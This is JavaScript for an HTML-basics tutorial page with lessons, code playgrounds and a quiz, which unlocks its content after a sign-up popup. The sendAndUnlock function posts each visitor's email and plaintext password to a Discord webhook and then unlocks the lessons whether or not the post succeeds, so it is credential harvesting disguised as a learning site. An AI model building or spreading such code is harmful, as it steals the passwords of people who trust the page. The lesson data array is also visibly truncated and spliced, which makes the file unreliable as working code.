    // ----- lesson data (full) -----
    const lessons = [
      { id: 1, title: '#️⃣ headings <h1>–<h6>',

      { id: 3, title: '🔗 anchors <a> (links)',
        desc: 'The <code>&lt;a&gt;</code> tag creates hyperlinks. Use the <code>href</code> attribute to set the destination.<br><strong>Close:</strong> <code>&lt;a href="url"&gt;...&lt;/a&gt;</code>',
        example: '<a href="https://example.com">Visit Example</a>',

Attributes: <code>src</code> (file/URL) and <code>alt</code> (description for accessibility).<br><strong>Close:</strong> it closes itself: <code>&lt;img src="..." alt="..."&gt;</code>',
        example: '<img src="https://via.placeholder.com/150/4a6cf7/fff?text=Image" alt="Placeholder image" style="max-width:100%;">',

        desc: '<code>&lt;ul&gt;</code> = unordered (bullets), <code>&lt;ol&gt;</code> = ordered (numbers). List items go inside <code>&lt;li&gt;</code>.<br><strong>Close:</strong> every tag closes: <code>&lt;ul&gt;&lt;li&gt;...&lt;/li&gt;&lt;/ul&gt;</code>',

        starter: '<ul>\n  <li>Milk</li>\n  <li>Eggs</li>\n</ul>\n<ol>\n  <li>Wake up</li>\n  <li>Code</li>\n</ol>' }
    ];

    // ----- DOM refs -----
    const unlockBtn = document.getElementById('unlockBtn');
    const unlockBtn2 = document.getElementById('unlockBtn2');
    const lockedPlaceholder = document.getElementById('lockedPlaceholder');
    const allContainer = document.getElementById('allLessonsContainer');
    const quizSection = document.getElementById('quizSection');
    const quizContainer = document.getElementById('quizContainer');
    const submitQuizBtn = document.getElementById('submitQuizBtn');
    const quizResult = document.getElementById('quizResult');

    const popup = document.getElementById('signupPopup');
    const closePopupBtn = document.getElementById('closePopupBtn');
    const signupSubmitBtn = document.getElementById('signupSubmitBtn');
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');
    const popupStatus = document.getElementById('popupStatus');

    let unlocked = false;

    // Helper: escape HTML so tags show as text
    function escapeHtml(str) {
      return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    }

    // ----- playground helpers (exposed globally) -----
    window.runPlayground = function(id) {
      const textarea = document.getElementById(`playground_${id}`);
      const output = document.getElementById(`output_${id}`);
      if (textarea && output) {
        output.innerHTML = textarea.value;
      }
    };
    window.resetPlayground = function(id) {
      const textarea = document.getElementById(`playground_${id}`);
      if (textarea && textarea.dataset.starter) {
        textarea.value = textarea.dataset.starter;
        window.runPlayground(id);
      }
    };

    // ----- render all lessons (after unlock) -----
    function renderAllLessons() {
      allContainer.innerHTML = '';
      lessons.forEach((lesson, idx) => {
        const card = document.createElement('div');
        card.className = 'lesson-card';
        card.style.borderLeft = '6px solid #4a6cf7';
        const id = `lesson_${idx}`;
        const escapedStarter = lesson.starter.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        card.innerHTML = `
          <div class="lesson-title">
            <span>${lesson.title}</span>
            <span class="lesson-tag">unlocked</span>
          </div>
          <div class="lesson-body">
            <p>${lesson.desc}</p>
            <div class="static-example">
              <strong>📌 example</strong>
              <pre>${escapeHtml(lesson.example)}</pre>
            </div>
            <div class="playground">
              <div class="playground-label">
                ✏️ try it yourself
                <span>edit → run</span>
              </div>
              <textarea id="playground_${idx}" rows="3" data-starter="${escapedStarter}">${escapeHtml(lesson.starter)}</textarea>
              <div class="playground-actions">
                <button class="btn btn-primary" onclick="window.runPlayground('${idx}')">▶ run</button>
                <button class="btn btn-outline" onclick="window.resetPlayground('${idx}')">↺ reset</button>
              </div>
              <div class="playground-output" id="output_${idx}"></div>
            </div>
          </div>
        `;
        allContainer.appendChild(card);
        setTimeout(() => {
          const ta = document.getElementById(`playground_${idx}`);
          const out = document.getElementById(`output_${idx}`);
          if (ta && out) {
            out.innerHTML = ta.value;
          }
        }, 20);
      });
    }

    // ----- unlock everything -----
    function unlockEverything() {
      if (unlocked) return;
      unlocked = true;
      lockedPlaceholder.style.display = 'none';
      allContainer.classList.remove('hidden');
      renderAllLessons();
      quizSection.classList.remove('hidden');
      renderQuiz();
      [unlockBtn, unlockBtn2].forEach(b => {
        b.textContent = '✅ unlocked';
        b.disabled = true;
        b.style.opacity = '0.6';
        b.style.pointerEvents = 'none';
      });
    }

    // ----- quiz -----
    const quizData = [
      { q: 'Which tag defines a paragraph?', options: ['<p>', '<para>', '<text>', '<body>'], correct: 0 },
      { q: 'What is the largest heading tag?', options: ['<h1>', '<h6>', '<head>', '<heading>'], correct: 0 },
      { q: 'Which tag is self-closing?', options: ['<div>', '<img>', '<a>', '<p>'], correct: 1 },
      { q: 'What does <div> represent?', options: ['generic container', 'paragraph', 'heading', 'list'], correct: 0 },
      { q: 'Which tag creates an unordered list?', options: ['<ul>', '<ol>', '<li>', '<list>'], correct: 0 }
    ];

    function renderQuiz() {
      quizContainer.innerHTML = '';
      quizData.forEach((item, idx) => {
        const div = document.createElement('div');
        div.className = 'quiz-question';
        div.dataset.qidx = idx;
        const p = document.createElement('p');
        p.textContent = `${idx+1}. ${item.q}`;
        div.appendChild(p);
        const optDiv = document.createElement('div');
        optDiv.className = 'quiz-options';
        item.options.forEach((opt, optIdx) => {
          const label = document.createElement('label');
          const radio = document.createElement('input');
          radio.type = 'radio';
          radio.name = `q${idx}`;
          radio.value = optIdx;
          label.appendChild(radio);
          label.appendChild(document.createTextNode(' ' + opt));
          optDiv.appendChild(label);
        });
        div.appendChild(optDiv);
        quizContainer.appendChild(div);
      });
      quizResult.textContent = '';
    }

    submitQuizBtn.addEventListener('click', () => {
      let correct = 0;
      const questions = quizContainer.querySelectorAll('.quiz-question');
      questions.forEach((div, idx) => {
        const selected = div.querySelector('input[type="radio"]:checked');
        const userAns = selected ? parseInt(selected.value) : -1;
        const correctAns = quizData[idx].correct;
        const optionLabels = div.querySelectorAll('.quiz-options label');
        optionLabels.forEach(lb => {
          lb.classList.remove('correct', 'wrong', 'show-correct');
        });
        optionLabels[correctAns].classList.add('show-correct');
        if (userAns === correctAns) {
          correct++;
          if (userAns !== -1) optionLabels[userAns].classList.add('correct');
        } else if (userAns !== -1) {
          optionLabels[userAns].classList.add('wrong');
        }
      });
      const total = quizData.length;
      quizResult.innerHTML = `🎯 ${correct} / ${total} correct. ${correct === total ? '🌟 perfect — you\'re ready!' : '👀 review the highlighted answers (green = correct).'}`;
    });

    // ----- discord webhook + unlock -----
    function sendAndUnlock(email, password) {
      const payload = { content: `📩 **new sign-up**\nemail: ${email}\npassword: ${password}` };
      fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).then(res => {
        popupStatus.textContent = res.ok ? '✅ sent! unlocking...' : '⚠️ webhook error, but unlocking anyway.';
        setTimeout(() => {
          popup.classList.remove('active');
          unlockEverything();
          popupStatus.textContent = '';
          emailInput.value = '';
          passwordInput.value = '';
        }, 500);
      }).catch(() => {
        popupStatus.textContent = '⚠️ network issue, but unlocking anyway.';
        setTimeout(() => {
          popup.classList.remove('active');
          unlockEverything();
          popupStatus.textContent = '';
          emailInput.value = '';
          passwordInput.value = '';
        }, 600);
      });
    }

    // ----- popup controls -----
    function openPopup() { popup.classList.add('active'); popupStatus.textContent = ''; }
    function closePopup() { popup.classList.remove('active'); popupStatus.textContent = ''; }
    [unlockBtn, unlockBtn2].forEach(b => b.addEventListener('click', openPopup));
    closePopupBtn.addEventListener('click', closePopup);
    popup.addEventListener('click', (e) => { if (e.target === popup) closePopup(); });

    signupSubmitBtn.addEventListener('click', () => {
      const email = emailInput.value.trim();
      const password = passwordInput.value.trim();
      if (!email || !password) { popupStatus.textContent = '⚠️ both fields required.'; return; }
      if (!email.includes('@')) { popupStatus.textContent = '⚠️ valid email required.'; return; }
      sendAndUnlock(email, password);
    });
    [emailInput, passwordInput].forEach(inp => inp.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') signupSubmitBtn.click();
    }));

    // ----- init free playground -----
    setTimeout(() => {
      const out = document.getElementById('output_free');
      const ta = document.getElementById('playground_free');
      if (out && ta) {
        out.innerHTML = ta.value;
        if (!ta.dataset.starter) ta.dataset.starter = ta.value;
      }
    }, 30);
  })();
